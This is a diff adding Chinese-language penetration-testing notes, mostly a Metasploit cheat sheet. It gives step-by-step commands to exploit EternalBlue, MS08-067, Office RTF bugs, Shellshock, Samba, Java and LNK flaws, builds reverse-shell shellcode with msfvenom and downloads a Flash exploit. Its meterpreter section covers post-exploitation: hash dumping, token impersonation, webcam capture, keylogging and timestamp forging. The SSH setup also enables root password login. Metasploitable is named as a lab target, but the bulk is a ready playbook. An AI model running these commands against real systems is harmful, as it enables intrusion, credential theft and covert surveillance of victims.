@@ -1,0 +1,486 @@
+
+vmware bridge 要去 vitual network editor 把 auto 改成無線網卡或有線網卡
+
+		### ssh
+
+sudo apt-get install openssh-server
+		
+vi /etc/ssh/sshd_config
+
+將 #PasswordAuthentication no 開啟並改成 yes
+將 PermitRootLogin prohibit-password 改成 PermitRootLogin yes
+
+保存並退出後, 啟動 ssh 服務
+
+service ssh start
+
+update-rc.d ssh enable ( 開啟自動啟動 )
+update-rc.d ssh disabled ( 關閉自動啟動 )
+
+
+檢查 ssh 狀態 : service ssh status
+
+
+
+
+		### MSF ( Metasploit Framework )
+
+Metasploitable :
+http://sourceforge.net/projects/Metasploitable/files/Metasploitable2
+預設帳密 : msfadmin:msfadmin
+
+更多 :
+https://community.rapid7.com/docs/DOC-1875
+
+
+滲透攻擊 ( Exploit )
+
+	由攻擊者利用系統、應用或服務中的安全漏洞進行攻擊
+	
+	包括 : 緩衝區溢出、web 應用程序漏洞攻擊、利用錯誤配置等
+	
+攻擊載荷 ( Payload )
+
+	攻擊載荷是期望目標系統被滲透攻擊後而執行的代碼
+	
+	包括 : 反彈式 shell、bind shell、bind
+	
+溢出代碼 ( Shellcode )
+	
+	shellcode 是在滲透攻擊時作為攻擊載荷運行的一組機器指令
+	
+
+	輸入 msfconsole 可以啟動程式
+	
+	MSF 在 Kali 中存放的路徑 : /usr/share/metasploit-framework
+	
+		modules : 各種模塊
+		
+			auxiliary 模塊 : 滲透測試中的一些輔助性腳本，腳本功能有掃描、嗅探、破解、注入、漏洞挖掘等
+			
+			encoders : 各種編碼工具，用於躲過入侵檢測和過濾系統
+			
+			exploits : 主要的攻擊代碼，包含 exp、0day、各種利用漏洞的腳本
+			
+				exploits 的子資料夾命名規則 : 系統 / 服務 / 模塊，如 : use exploits/windows/ssh/freeftpd_key_exchange.rb
+				
+			payloads : 攻擊者發送給系統執行的指令，payloads主要是給目標執行，exploits主要是給本地執行作用於目標
+			
+			post : 存放著 exploits 執行成功後，向目標發送的一些功能性指令，如 : 提權、獲取 hash 等
+			
+		data : 存放 Meterpreter、PassiveX、Vnc、DLLs 等工具和用戶接口代碼，Msfweb 和其他模塊用到的數據文件
+		
+		plugins : 存放用 load 加載的模塊，提供數據庫連接插件和各種插件
+		
+		scripts : 資料夾下的文件大多是 Meterpreter 模塊利用的腳本
+		
+		tools : 包含有用的腳本和零散的工具
+		
+更新 msf
+
+	卸載 msf :
+	
+		sudo rm /var/cache/apt/archives/lock
+		sudo rm /var/cache/apt/archives/
+		apt remove metasploit-framework
+
+	添加數字簽名 :
+	
+		wget archive.kali.org/archive-key.asc
+		apt-key add archive-key.asc
+	
+	安裝 msf :
+	
+		apt-get update
+		apt-get install metasploit-framework
+		systemctl start postgresql
+		systemctl enable postgresql
+		msfdb init
+		msfconsole
+		
+msf 基本命令 :
+
+	search : 搜索模塊名和描述
+	connect : 連接一個主機
+	info : 顯示一個或多個模塊訊息
+	show : 顯示所有類型的模塊
+	irb : 進入 irb 腳本模式
+	jobs : 顯示和管理任務
+	kill : 殺死一個任務
+	loadpath : 加載一個模塊的路徑
+	load : 加載一個插件
+	unload : 卸載一個模塊
+	resource : 運行儲存在一個文件中的命令
+	route : 查看一個會話的路由訊息
+	save : 保存
+	sleep : 睡眠指定秒數
+	set : 賦值一個變量
+	unset : 解除一個或多個變量
+	setg : 賦值一個全域變量
+	unsetg : 解除一個或多個全域變量
+	version : 顯示 MSF 和控制台版本
+	exit : 退出 Msf
+	quit : 退出 MSF
+	
+	
+exploits 模塊 :
+
+	命名規則 : 系統 / 服務 / 名稱，例 : windows/ssh/securecrt_ssh1 
+	RHOST : 目標 IP 地址
+	RPORT : 目標端口
+	LHOST : 攻擊者 IP 地址
+	LPORT : 攻擊者端口
+	Payload : 有效的載荷，成功後返回 shell
+
+payload 模塊 :
+
+	命名規則 : 系統 / 類型 / 名稱
+	shell : 上傳一個 shell
+	dllinject : 注入一個 dll 到進程
+	patchup : 修補漏洞
+	upexec : 上傳並執行一個文件
+	meterpreter : 高級的 payload
+	vncinject : 高級的 payload
+	passive : 高級的 payload
+	
+	shell_find_tag : 在一個已建立的連接上創建一個 shell
+	shell_reverse_tcp : 反向連接到攻擊者主機並創建一個 shell
+	bind_tcp : 監聽一個 tcp
+	reverse_tcp : 反向建立一個 tcp
+	reverse_http : 通過 http 通信並創建一個新用戶和添加管理組
+	add_user : 創建一個新用戶並添加管理組
+	xxx_ipv6_tcp : 基於 IPV6
+	xxx_nonx_tcp : no execute 或 win7
+	xxx_ord_tcp : 有序 payload
+	xxx_tcp_allports : 所有可能的端口
+	
+
+網路伺服器攻擊滲透 ( MS08-67 )
+
+	search ms08_067
+	use exploit/windows/smb/ms08_067_netapi
+	show options
+	info
+	set RHOSTS xxx.xxx.xxx.xxx
+	check	( 檢查目標是否存在漏洞 )
+	exploit
+	
+瀏覽器攻擊滲透 ( ms10-018 )
+
+	search ms10_018
+	use exploit/windows/browser/ms10_018_ie_behaviors
+	show options
+	set SRVHOST xxx.xxx.xxx.xxx
+	set PAYLOAD windows/meterpreter/bind_tcp
+	( set LPORT 4441 )
+	run
+	目標主機瀏覽器訪問指定網址，即可獲取該主機權限
+	sessions -i
+	sessions -i 1 ( 進入目標主機的 shell )
+	
+應用程式格式滲透，利用 word 滲透 ( ms10-087 )
+	
+	search ms10_087
+	use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
+	show options
+	( set FILENAME xxx.rtf )
+	set payload windows/execute
+	set CMD calc.exe
+	run
+	在目標主機執行產生的檔案，即可執行 calc.exe
+	
+	另一個 :
+	search rtf
+	use exploit/windows/fileformat/office_ms17_11882
+	show options
+	( set FILENAME xxx.rtf )
+	set SRVHOST xxx.xxx.xxx.xxx
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST xxx.xxx.xxx.xxx
+	run
+	目標主機瀏覽器訪問指定網址或打開指定文件，即可下載指定檔案
+	
+網路伺服器攻擊滲透 ( MS17-010 , 永恆之藍 )
+
+	search ms17_010
+	use exploit/windows/smb/ms17_010_eternalblue
+	show options
+	set RHOST xxx.xxx.xxx.xxx
+	set LHOST xxx.xxx.xxx.xxx
+	set payload windows/x64/meterpreter/reverse_tcp
+	run
+	hashdump
+	shell
+	
+	
+meterpreter shell 的命令 :
+
+	上傳 :
+	
+		upload <file> <destination>
+
+	下載 :
+	
+		download <file> <path>
+	
+	執行 :
+	
+		execute -f <path> [options]
+	
+	創建 CMD :
+	
+		execute -f cmd -c
+		
+	顯示進程 :
+	
+		ps
+		
+	獲取目標 cmd shell :
+	
+		shell
+		
+	獲取 admin 權限 :
+	
+		getsystem
+		
+	dump 目標主機的帳號和密碼 :
+	
+		1. hashdump
+		2. run credcollect
+	
+	端口轉發 :
+
+		meterpreter shell 的 portfwd 是轉發命令，可以訪問系統無法直接訪問的目標
+		
+		portfwd add -l 6666 -p 3389 -r 127.0.0.1	( 將目標的 3389 端口轉發到本機的 6666 )
+		portfwd delete -l 6666 -p 3389 -r 127.0.0.1
+		portfwd list
+		portfwd flush
+	
+	搜尋 :
+	
+		search : 可以查找目標主機上的特定文件或文件夾
+		search -f *.txt
+	
+	獲取使用者 ID :
+	
+		getuid : 顯示主機上運行 meterpreter 的使用者
+		
+	獲取系統訊息 :
+	
+		sysinfo : 顯示系統名、操作系統、架構和語言
+		
+	模擬任意使用者 :
+	
+		getsystem
+		use incognito
+		list_tokens -u
+		impersonate_token "Machine\\user"
+		
+	webcam :
+	
+		webcam_list
+		webcam_snap
+		webcam_stream
+	
+	伪造時間戳 :
+	
+		timestomp C:// -h
+		
+	enable_rdp 腳本開啟 3389 端口 :
+	
+		run post/windows/manage/enable_rdp	( 開啟遠程桌面 )
+		run post/windows/manage/enable_rdp USERNAME=test PASSWORD=123	( 添加使用者 )
+		run post/windows/manage/enable_rdp FORWARD=true LPORT=6666		( 將 3389 端口轉發到 6666 端口 )
+	
+	紀錄鍵盤 :
+	
+		keyscan start
+		keyscan dump
+		keyscan stop
+	
+	其他 :
+		
+		https://xz.aliyun.com/t/2536
+	
+	
+利用 samba 服務漏洞入侵 linux 主機 ( 利用 CVE-2017-7494 與 smaba 低版本漏洞 ) :
+
+	方法一 :
+	
+		nmap -$S -Pn -A xxx.xxx.xxx.xxx		( 若發現 139, 445 端口，即可能存在 samba 服務遠程溢出漏洞 )
+		msfconsole
+		search scanner/samba
+		
+		use exploit/multi/samba/usermap_script
+		set RHOSTS xxx.xxx.xxx.xxx
+		exploit
+	
+	方法二 :
+	
+		use exploit/linux/samba/is_known_pipename
+		show options
+		info
+		set rhost xxx.xxx.xxx.xxx
+		( set target <number> )
+		exploit
+	
+	
+Bash Shellshock CVE-2014-6271 :
+
+	目標機器 : 
+	
+		cd /usr/lib/cgi-bin
+		sudo nano hello.sh
+		hello.sh 內容 :
+			#! /bin/bash
+			echo "Content-type: text/html"
+			echo ""
+			echo "Hello world!"
+		sudo chmod 755 hello.sh
+		瀏覽器輸入 : http://xxx.xxx.xxx.xxx/cgi-bin/hello.sh 檢查是否成功
+	
+	攻擊機器 :
+	
+		msfconsole
+		search shellshock
+		use exploit/multi/http/apache_mod_cgi_bash_env_exec
+		show options
+		set RHOSTS xxx.xxx.xxx.xxx
+		set LHOSTS xxx.xxx.xxx.xxx
+		set targeturi /cgi-bin/hello.sh
+		set payload linux/x86/shell/reverse_tcp
+		check
+		exploit
+		
+php CGI 漏洞 :
+
+	search cve:2012-1823
+	use exploit/multi/http/php_cgi_arg_injection
+	show options
+	set RHOSTS xxx.xxx.xxx.xxx
+	exploit
+	shell
+	
+Java RMI server 命令執行漏洞 :
+
+	nmap -p0-65535 IP	( 查看 1099 端口 )
+	use exploit/multi/misc/java_rmi_server
+	set RHOSTS xxx.xxx.xxx.xxx
+	exploit
+	shell
+	
+Java cve-2013-0422 :
+	
+	use exploit/multi/browser/java_jre17_jmxbean
+	set SRVHOST xxx.xxx.xxx.xxx
+	set target <number>
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST xxx.xxx.xxx.xxx
+	exploit
+	
+Distcc 後門漏洞 :
+
+	use exploit/unix/misc/distcc_exec
+	set RHOSTS xxx.xxx.xxx.xxx
+	exploit
+	
+Druby 命令執行 :
+
+	search drb
+	use exploit/linux/misc/drb_remote_codeexec
+	show options
+	set RHOSTS xxx.xxx.xxx.xxx
+	( set URL druby://xxx.xxx.xxx.xxx:8787 )
+	exploit
+	
+遠程快捷方式漏洞 ( CVE-2017-8464 ) :
+
+	msfconsole
+	search 2017_8464
+	use exploit/windows/fileformat/cve_2017_8464_lnk_rce
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST xxx.xxx.xxx.xxx
+	exploit
+	讓目標點擊產生的檔案
+	
+	search multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST xxx.xxx.xxx.xxx
+	run
+
+flash 0day ( CVE-2018-4878 ) :
+
+	wget https://raw.githubusercontent.com/backlion/demo/master/CVE-2018-4878.rar
+	解壓縮後，修改 cve-2018-4878.py 的 stageless=False
+	在 kali 下產生 msf 的 shellcode ( 用舊版本的kali產生，大小為 333 bytes ) :
+		msfvenom -p windows/meterpreter/reverse_tcp lhost=xxx.xxx.xxx.xxx lport=<number> -f python>shellcode.txt
+	將產生的 shellcode 替換掉 cve-2018-4878.py 中的 shellcode
+	python cve-2018-4878.py 產生 index.html 和 exploit.swf
+	讓目標訪問 index.html
+	
+	在 msf 下進行監聽 :
+	
+		msfconsole
+		use exploit/multi/handler
+		set payload windows/meterpreter/reverse_tcp
+		set lhost xxx.xxx.xxx.xxx
+		set lport <number>
+		exploit
+
+
+auxiliary ( 輔助 ) 模塊 :
+
+	whois 訊息探測 : 
+		
+		msfconsole
+		whois <name>
+		
+	查找信箱 :
+	
+		use auxiliary/gather/search_email_collector
+		set DOMAIN <name>
+		run
+		
+	DNS 枚舉 :
+	
+		use auxiliary/gather/enum_dns
+		set DOMAIN <name>
+		run
+		
+
+	### 訊息蒐集
+	
+	一般域名漏洞掃描有 AWVS、APPSCAN、Netspark、WebInspect、Nmap、Nessus、WVSS、RSAS
+		
+	子域名搜索 :
+	
+		1. DNS 域傳送漏洞 : kali 下 dnsenum google.com
+		
+		2. SSL 證書 : https://myssl.com/ssl.html
+		
+		3. google 搜尋 :
+		
+			inurl : 搜索網頁上包含的 URL
+			intext : 搜索網頁中包含的文字
+			site : 限制搜索範圍的域名
+			filetype : 搜索文件的後綴或擴展名	例 : filetype:pdf
+			intitle : 限制搜索的網頁標題
+			link : 搜索所有包含指定 URL 的列表
+		
+	信箱搜索 :
+	
+		The Harvester : https://github.com/laramies/theHarvester
+		
+	### Web 辨識
+	
+	輔助工具 : whatweb、Wapplyzer
+	網站 : https://www.anquanke.com/post/id/178230
+	
+	### fofa
+	
+		網站 : https://fofa.so/
+		說明 : https://fofa.so/help
+		
+	
+	
